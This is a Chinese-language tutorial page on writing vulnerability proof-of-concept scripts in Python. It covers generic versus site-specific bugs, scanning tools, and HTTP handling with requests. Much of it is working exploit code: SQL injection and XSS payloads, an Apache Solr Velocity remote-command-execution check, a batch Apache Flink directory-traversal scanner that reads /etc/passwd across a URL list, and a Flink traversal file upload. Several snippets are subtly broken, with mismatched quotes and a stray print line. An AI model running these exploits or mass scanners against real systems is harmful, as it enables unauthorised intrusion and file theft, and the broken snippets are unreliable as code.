# POC编写相关

   
why how what  
  
为什么要用POC？列举一下渗透测试过程中遇到的漏洞，什么是通用型漏洞，一般怎么测试通用型漏洞。引入burpsuite与test404两种工具  
  
如何使用POC？举例pocsuite以及上述工具中的使用方法  
  
什么是POC？根据名词解释阐述一下，然后再简述一下写脚本需要用到的python库以及方法，以及如何优化POC  


## 一，WHY

以靶场为例，任何靶场都行，主要是POST或者GET类型，要求有输入框

以输入框为漏洞点，我们可以判定，最起码在这个网站上，这个输入点有漏洞（这种漏洞叫事件型）

![&#x67D0;&#x7F51;&#x7AD9;&#x7591;&#x4F3C;SQL&#x6CE8;&#x5165;](../../.gitbook/assets/image%20%281080%29.png)

那么通用型漏洞是什么样子的呢？可以看到网站使用了什么样的CMS，然后尝试搜索一下其他使用同样CMS的网站，去同样的点试试，如果尝试成功了，或者下载了对应的CMS到本地复线成功了，那就可以说，这个漏洞是通用型漏洞

> 还是上面那张图，可以说 sqli-labs靶场环境存在SQL注入漏洞

从可视化的界面来看，我们可能只能知道，某网站的顶部的搜索框存在某个漏洞，因为当输入了一些字符串以后，页面会返回一个框，上面显示着 1 ，那么假如在知道了HTTP抓包后，就可以知道，其实是某个文件的某个参数存在漏洞，而页面中的搜索框就算到了网页的任意位置，对那个参数也没有任何影响。这个时候，返回包中的特征值，可能就是alert\(1\)（这就是特征）

![&#x5BF9;&#x5E94;&#x7684;&#x7279;&#x5F81;&#xFF1A;&#x67E5;&#x8BE2;&#x4E86;1&#x7684;MD5&#x503C;](../../.gitbook/assets/image%20%281079%29.png)

一般渗透测试的时候，我们会去扫描目录，去扫描文件

对应可以使用burp的Repeater或者Intruder模块，或者使用御剑这个工具

原理也是根据一个IP地址，然后根据提供的字典，不停替换后面的字符串，再根据返回的响应值判断目标是否有那个目录，文件

200:存在  
30X：存在  
403:常见于一些目录，一般情况下意味着没有权限访问，不过是存在的  
404:确定了不存在了，在访问一些文件时比较常见

200: 极端一些，文件不存在。案例有阿里云等网站，会有自定义的404页面，此时返回值依旧是200

在找到对应的文件，或者功能点的时候，就可以发送任意的模糊数据，去测试一下这个点上是否存在着其他的漏洞类型呢

比如针对 a.php?id=1

这里可以存在注入，也可能会有XSS漏洞存在。可能这个ID是从提交的文本框中来的

这个时候，也可以用burp去尝试payload，去找到可能存在的漏洞类型

那么，漏洞我找到了，我也知道这个网站使用的CMS了，我这边还找到了一些其他的网站，也是使用的这个CMS，我又应该怎么测试其他网站呢？

方法一：浏览器上，手动更换前面的URL部分，一个个尝试  
方法二：浏览器插件，也是手动，一个个尝试  
方法三：test404工具，将根目录至payload部分剪切出来，再把返回包里面的相关的特征值复制出来，点击保存。之后可以导入大量的网址信息，测试完以后，就可以在短时间内测试出哪些网站可能会存在漏洞

工具差别：如果说burp可以替换根目录以后的各种文件以及参数值来确定一个网站是否有各种各样的情况，那么test404可以根据确定一种情况后的文件去探索各种各样的网站是否存在规定好的那种情况

## 二，HOW

至于怎么使用漏洞验证脚本，根据各种框架的不同，有不同的用法。

例如单个的脚本，可以直接通过 python ![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF%28TYDYECOKVDYB.png)poc.py ![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF%28TYDYECOKVDYB.png)http://hao123.com,  python ![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF%28TYDYECOKVDYB.png)poc.py url.txt

第一个：扫描好123网站是否会存在POC中定义的漏洞内容  
第二个：逐个扫描TXT文档中的URL是否会有POC中的漏洞

示例：（参数不一定对）  
如果是使用的漏扫框架，则是： X-ray - u URL - R POC  
通过U参数，输入URL，也可以通过F来输入一个文件内容为很多URL的文件，再通过- R来确定POC

## 三，WHAT

POC，POC \(Proof of Concept\) 验证性测试，译为为观点提供证据，可以理解为证明漏洞存在的代码.

一般来讲，更多人会喜欢使用python语言编写，因为简单。

目前互联网上有的框架，也会使用json，yaml来写，不过会有一些局限性。也有的软件会使用java去编写。

文档以python为例：

### 1，简单发包

因为要发送HTTP请求，所以需要导入requests库，可以通过引用相关方法去发送请求，如GET，POST，PUT等

简单漏洞的burp抓包内容如下：

体现到代码中，就是：

```python
Req = requests.get()
Req = requests.post()
```

也可以这样：

```python
Req = requests.request("POST")
```

首先，可以将请求路径部分赋值给 path

```python
Path = "/confit.php"
```

之后便是请求行的部分了，在burp中，会发现如果请求的时候没有HOST，那么访问就会失败，不过在python中，不需要刻意定义HOST。为了方便起见，可以先在burp中将请求行简化到最简单，然后放到下面的内容中：

```python
headers = {
    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
```

那么此时，若根据图中的内容编写一个简单的发包示例，应该怎么编写呢？

![&#x8FD9;&#x662F;&#x539F;&#x6765;&#x7684;&#x5305;](../../.gitbook/assets/image%20%281078%29.png)

**注意**：发包时，内容要最简化

![&#x7B80;&#x5316;&#x540E;](../../.gitbook/assets/image%20%281082%29.png)

所以，此时的发包脚本可以这么编写：

```python
import requests

headers = {
    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
target = "http://127.0.0.1:8008"
url = target + path
req = requests.get(url, headers=headers, timeout=10)

print req.status_code
print req.headers
print req.content  (or print req.text)
```

 为什么脚本中没有HOST字段呢？？？？  
因为在python中，可以自带HOST，而不需要手动指定HOST，更方便了我们的使用

timeout是啥？  
在访问一些网站的时候，总会有延迟，所以会设置超时，一般设置几秒自己开心就好  
如果是国外的网站，可能延迟会比较高，这个时候可以设置的高一些，比如30左右

 当运行代码后，你收到的可能是这样的：

```javascript
200
{"Date": "Thu, 22 Apr 2021 03:16:33 GMT","Server": "Apache/2.4.7 (Ubuntu)","X-Powered-By": "PHP/5.5.9-1ubuntu4.13","Vary": "Accept-Encoding","Content-Length": "750","Content-Type": "text/html"}
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-2 **Error Based- Intiger**</title>
</head>
<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">
<font size='5' color= '#99FF00'>Your Login name:c4ca4238a0b923820dcc509a6f75849b<br>Your Password:55555</font>
</font> </div></br></br></br><center>
<img src="../images/Less-2.jpg" /></center>
</body>
</html>
```

而在burpsuite的显示中，是这个样子的：

```yaml
HTTP/1.1 200 OK
Date: Thu, 22 Apr 2021 03:16:33 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.13
Vary: Accept-Encoding
Content-Length: 750
Content-Type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-2 **Error Based- Intiger**</title>
</head>

<body bgcolor="#000000">

<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<font size='5' color= '#99FF00'>Your Login name:c4ca4238a0b923820dcc509a6f75849b<br>Your Password:55555</font>

</font> </div></br></br></br><center>
<img src="../images/Less-2.jpg" /></center>
</body>
</html>
```

上述请求中，只是根据一个SQL注入，简单查询了1的MD5值，此时，返回包中的较为明显的特征值有：

```text
HTTP/1.1 200 OK    # 返回值为200
c4ca4238a0b923820dcc509a6f75849b    # 1的MD5值
```

那么此时，脚本可以使用 `try-except`组合与`if-else`组合来编写：

```python
import requests

headers = {
    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
target = "http://127.0.0.1:8008"
url = target + path
try:
    req = requests.get(url, headers=headers, timeout=10)
    if req.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in req.text:
        print "漏洞存在"
except exception as e:
    print str(e)
    print "漏洞不存在"

```

###  2，HTTPS

 当我使用浏览器访问一个以HTTPS开头的网页时，浏览器总会出现一些想让我手点的地方，比如“接受风险并继续”

![](../../.gitbook/assets/image%20%281081%29.png)

那么在python中，我应该怎么做呢？

在1中的代码基础上，只需要添加一个字段，再多写两行代码就行，代码如下：

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
target = "http://127.0.0.1:8008"
url = target + path
req = requests.get(url, headers=headers, timeout=10, verify=False)

print req.status_code
print req.headers
print req.content  (or print req.text)
```

 我只关闭认证，使用 verify=False ,那么就会得到下面的报错：

```text
InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. 
See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
```

 所以，需要添加两行代码，大意即为禁用安全请求警告：

```python
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
```

此时，上面的代码就可以直接访问页面了

### 3，302跳转

 一般在浏览器上，最常见的是在登录框附近，当输入账号与密码后，会直接跳转至后台，而在burpsuite中，则会显示成这样：

![burp&#x622A;&#x56FE;](../../.gitbook/assets/image%20%281083%29.png)

 而当上面例子中的代码执行的时候，还是会自动跳转到原来应该跳转到的页面，这个时候如果想让回显为302，那么应该在请求的段中添加如下代码：

```python
req = requests.post(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
# allow_redirects=False ,设置不自动跳转
```

### 4，POST方式提交信息

POST方式提交信息时，可直接定义字段，并在requests方法中赋值给data即可，如下：

```python
data = "username=admin&passwd=admin"
req = requests.post(url, headers=headers, data=data, timeout=10, verify=False, allow_redirects=False)
```

### 5，文件上传

 在burp抓包时，通常可见到文件上传的时候，都是使用POST形式上传的，而市面上的大部分脚本都是用POST方式直接将Body体放到了一个字段中，看起来比较麻烦

```text
POST /jars/upload HTTP/1.1
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
Host: IP:PORT
Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
Content-Length: 181

--16403e4608fad6cc1cd8321b8b7d7f22
Content-Disposition: form-data; name="jarfile"; filename="1.txt"

Hello Requests.
--16403e4608fad6cc1cd8321b8b7d7f22--
```

 部分脚本示例：其中，还在脚本的headers头中定义了boundray，并且在文本中添加了\r\n作为回车代替，看起来不简洁

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Content-Type": "multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22"
}
data = "--16403e4608fad6cc1cd8321b8b7d7f22\r\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"1.txt\"\r\n\r\nHello Requests.\r\n--16403e4608fad6cc1cd8321b8b7d7f22--"
path = "/jars/upload"
target = "http://127.0.0.1:8008"
url = target + path
req = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
```

 其实，当文件上传时，请求行中的content-type字段并不需要特别定制，后面的boundray也是。此时，脚本可以这样编写：

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
path = "/jars/upload"
target = "http://127.0.0.1:8008"
file = {
    # 'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
    'file[]': ('shell.php', data, 'application/octet-stream'),
    'name2': (None, 'huan'),
    None: ('haha', 'ni'),
    None: ('xixi', 'ya'),
        }
url = target + path
req = requests.get(url, headers=headers, files=file, timeout=10, verify=False)
```

![&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x53CA;&#x663E;&#x793A;&#x6548;&#x679C;](../../.gitbook/assets/image%20%281074%29.png)

### 6，巧用随机数

















































POC编写的相关内容如下：

{% tabs %}
{% tab title="单次请求" %}
代码如下

```python
#coding:utf-8
#https://twitter.com/jas502n/status/1193869996717297664
import urllib2
import ssl

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		url = self.result['target'] + '/overview'
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		# ssl._create_default_https_context = ssl._create_unverified_context
		try:
			req = urllib2.Request(url,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			if '"taskmanagers"' in text and 'flink-version' in text:
				self.result['status'] = True
				self.result['target'] = url
				self.result['method'] = 'GET'
				self.result['response'] = 'flink-version'
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="多次请求" %}
代码如下

```python
#coding:utf-8
#https://www.anquanke.com/post/id/190039
import urllib2
import ssl
import re

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		ssl._create_default_https_context = ssl._create_unverified_context
		try:
			url_core = self.result['target'].rstrip('/') + '/solr/admin/cores?indexInfo=false&wt=json'
			req = urllib2.Request(url_core,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			res = re.search(r'"instanceDir":"(.*?)",',text)
			if res == None:
				return self.result
			else:
				core = res.group(1).split('\\')[-1]
				url_config = self.result['target'].rstrip('/') + '/solr/%s/config'%(core)
				headers1 = {
					"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
					"Content-Type": "application/json"
				}
				data = '''
				{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'''
				req = urllib2.Request(url_config,headers=headers1,data=data)
				rsp = urllib2.urlopen(req,timeout=8)
				url = self.result['target'].rstrip('/') + '/solr/{0}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27netstat%20-an%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(core)
				req = urllib2.Request(url,headers=headers)
				rsp = urllib2.urlopen(req,timeout=8)
				text = rsp.read()
				if 'LISTEN' in text and 'ESTABLISHED' in text:
					self.result['status'] = True
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="改批量" %}
相关代码如下：

```python
#!/usr/bin/env python
# coding:utf-8
# author:Yxuan
#affected versions are Apache Flink 1.11.0-1.11.2

import requests,sys,colorama
from colorama import *
init(autoreset=True)


banner='''\033[1;33;40m
  _______      ________    ___   ___ ___   ___        __ ______ _____ __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ |____  | ____/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| |   / /| |__  | | (_) |
| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |  / / |___ \ | |\__, |
| |____   \  /  | |____    / /_| |_| / /_| |_| |      | | / /   ___) || |  / / 
 \_____|   \/   |______|  |____|\___/____|\___/       |_|/_/   |____/ |_| /_/                                                                                                                                                 
'''


def verify():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' 
	poc=urls+payload
	try:
		requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
		response=requests.get(poc,headers=headers,timeout=15,verify=False)
		if response.status_code==200 and "root:x" in response.content:
			print(u'\033[1;31;40m[+]{} is apache flink directory traversal vulnerability'.format(urls))
			print(response.content)
			#将漏洞地址输出在Vul.txt中
			f=open('./vul.txt','a')
			f.write(urls)
			f.write('\n')
		else:
			print('\033[1;32;40m[-]{} None'.format(urls))
	except:
		print('{} request timeout'.format(urls))


if __name__ == '__main__':
	print (banner)
	if len(sys.argv)!=2:
		print('Example:python CVE-2020-17519.py urls.txt')
	else:
		file = open(sys.argv[1])
		for url in file.readlines():
			urls=url.strip()
			if urls[-1]=='/':
				urls=urls[:-1]
			verify()
		print ('Check Over')
```
{% endtab %}
{% endtabs %}

对于不同种类的漏洞，最好是有不同的检测方式，例如xray中采用了随机数值的方式检测SQL注入与XSS，那么使用随机数版本的漏扫脚本大概就是这样的：

{% tabs %}
{% tab title="随机数" %}
随机数版本所需代码如下：

```python
# -*- coding: utf-8 -*-
import random
import string
import hashlib

# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))

shuzhi = random.randint(0,999999)
yuju = str(shuzhi)
# ------ xss ------

xss = "<script>alert(%s)</script>" % yuju
xss = "<script>alert(" + yuju + ")</script>"

# ------ sqli ------

sqli = hashlib.md5(yuju).hexdigest()
```
{% endtab %}

{% tab title="时间戳" %}
```python
import time

noww = int(time.time())
now = str(noww)
print now

payloads = "/assets/config/config%s.json" % now
```
{% endtab %}
{% endtabs %}

文件上传的方式

{% tabs %}
{% tab title="简洁" %}
```python
# -*- coding: utf-8 -*-

import requests
import random,hashlib
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

target = "https://IP:PORT"
shuzhi = random.randint(0, 999999)
yuju = str(shuzhi)
mdfive = hashlib.md5(yuju).hexdigest()
path = "/jars/upload"
url = target + path
boundry = "----WebKitFormBoundaryoZ8meKnrrso89R6Y"
headers = {
    "Host": target.split("://")[1],
    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

files = {'jarfile': ('../../../../../../tmp/flags', mdfive)}
# proxy = {
#     'http':'http://127.0.0.1:8081',
#     'https':'https://127.0.0.1:8081'
# }

req = requests.post(url, headers=headers, files=files, timeout=10, verify=False)
print req.content
if req.status_code == 400:
    print req.content
    path_1 = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflags"
    url_1 = target + path_1
    req_1 = requests.get(url_1, headers=headers, timeout=10, verify=False)
    print req_1.text

    if req_1.status_code == 200:
        print  "hahahaha"
        
        
# name:jarfile
# filename:../../../../../../tmp/flags
#文件内容：mdfive
↓        ↓        ↓        ↓        ↓
# POST /jars/upload HTTP/1.1
# Connection: close
# Accept-Encoding: gzip, deflate
# Accept: */*
# User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
# Host: IP:PORT
# Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
# Content-Length: 181

# --16403e4608fad6cc1cd8321b8b7d7f22
# Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/flags"
# 
# Hello Requests.
# --16403e4608fad6cc1cd8321b8b7d7f22--
```
{% endtab %}

{% tab title="分段" %}
当文件上传遇到分段传输：

相关代码示例如下：

```python
file = {
    'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
    'file[]': ('shell.php', data, 'application/octet-stream'),
    'name2': (None, 'huan'),
    None: ('haha', 'ni'),
    None: ('xixi', 'ya'),
}
```
{% endtab %}
{% endtabs %}



